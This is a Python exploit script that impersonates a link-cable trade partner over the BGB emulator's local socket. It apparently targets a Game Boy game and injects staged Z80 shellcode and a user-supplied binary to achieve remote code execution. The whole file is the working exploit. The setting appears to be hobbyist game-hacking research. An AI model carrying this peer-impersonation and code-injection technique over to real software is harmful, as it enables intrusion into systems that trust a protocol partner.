import socket
import time
import random
import threading
import sys
import os

class BGBLinkCable():
	def __init__(self,ip,port):
		self.ip = ip
		self.port = port
		self.ticks = 0
		self.frames = 0
		self.received = 0
		self.sent = 0
		self.transfer = -1
		self.exchangeHandler = None
		
	def start(self):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.connect((self.ip, self.port))
		threading.Thread(target=self.networkLoop, daemon=True).start()
	
	def queryStatus(self):
		status = [0x6a,0,0,0,0,0,0,0]
		self.ticks += 1
		self.frames += 8
		status[2] = self.ticks % 256
		status[3] = (self.ticks // 256) % 256
		status[5] = self.frames % 256
		status[6] = (self.frames // 256) % 256
		status[7] = (self.frames // 256 // 256) % 256
		return bytes(status)
		
	def getStatus(self):
		return (self.frames, self.ticks, self.received, self.sent)
	
	def networkLoop(self):
		while True:
			try:
				data = bytearray(self.sock.recv(8))
			except KeyboardInterrupt:
				raise
			if len(data) == 0:
				break
			if data[0] == 0x01:
				self.sock.send(data)
				self.sock.send(b'\x6c\x03\x00\x00\x00\x00\x00\x00')
				continue
			if data[0] == 0x6C:
				self.sock.send(b'\x6c\x01\x00\x00\x00\x00\x00\x00')
				self.sock.send(self.queryStatus())
				continue
			if data[0] == 0x65:
				continue
			if data[0] == 0x6A:
				self.sock.send(self.queryStatus())
				continue
			if (data[0] == 0x69 or data[0] == 0x68):
				self.received+=1
				self.sent+=1
				data[1] = self.exchangeHandler(data[1], self)
				self.sock.send(data)
				self.sock.send(self.queryStatus())
				continue
			print("Unknown command " + hex(data[0]))
			print(data)
			
	def setExchangeHandler(self, ex):
		self.exchangeHandler = ex

fuzz = False
cnt = 0
stage = 0
	
def stage0(data, obj):
	global cnt, stage
	cnt += 1
	if cnt == 1:
		print("[+] Received handshake, delaying...")
	if data == 0xd1:
		stage += 1
		cnt = 0
	if (data == 0x61): return 0x61
	return 0x02 #data

def stage1(data, obj):
	global cnt, stage
	cnt += 1
	if cnt >= 3:
		print("[+] Connection acquired! Waiting for the trade start signal")
		stage += 1
	return data

def stage2(data, obj):
	global cnt, shellcode, stage
	print("[+] Shellcode stage 1 (%i bytes)..." % len(shellcode))
	stage = 3
	rnd = shellcode[0]
	cnt = 1
	return rnd
	
def stage3(data, obj):
	global cnt, shellcode, stage
	try:
		rnd = shellcode[cnt]
		cnt += 1
		print("\r[!] Transferring: %i/%i" % (cnt, len(shellcode)), end='')
	except IndexError:
		with open(sys.argv[1], 'rb') as fp:
			shellcode = fp.read()
		print("\n[+] Shellcode stage 2 (%i bytes)..." % len(shellcode))
		rnd = shellcode[0]
		cnt = 1
		stage += 1
	return rnd
	
def stage4(data, obj):
	global cnt, shellcode, stage
	rnd = shellcode[cnt]
	cnt += 1
	print("\r[!] Transferring binary: %i/%i" % (cnt+1, len(shellcode)), end='')
	if cnt >= len(shellcode)-1:
		print("\n[+] Operation completed successfully")
		obj.sock.close()
		os._exit(0)
	return rnd

def myHandler(data, obj):
	global cnt, stage
	stages = [stage0, stage1, stage2, stage3, stage4]
	rnd = stages[stage](data, obj)
	# print("[*] DEBUG: Serial data: INDEX=%.4X; Got %.2x, responding with %.2x" % (cnt, data, rnd))
	rndprev = rnd
	return rnd

if len(sys.argv) < 2:
	print("Usage: crystal_rce.py <BINARY>")
	print("BINARY should be a headerless block of GB Z80 machine code, 256 bytes in size")
	sys.exit(1)
	
with open('shellcode.bin', 'rb') as fp:
	shellcode = fp.read()

try:
	print("[!] Connecting to 127.0.0.1:8765...")
	link = BGBLinkCable('127.0.0.1',8765)
	link.setExchangeHandler(myHandler)
	link.start()
	print("[!] Waiting for link cable interaction")
	while True:
		time.sleep(1)
except KeyboardInterrupt:
	pass
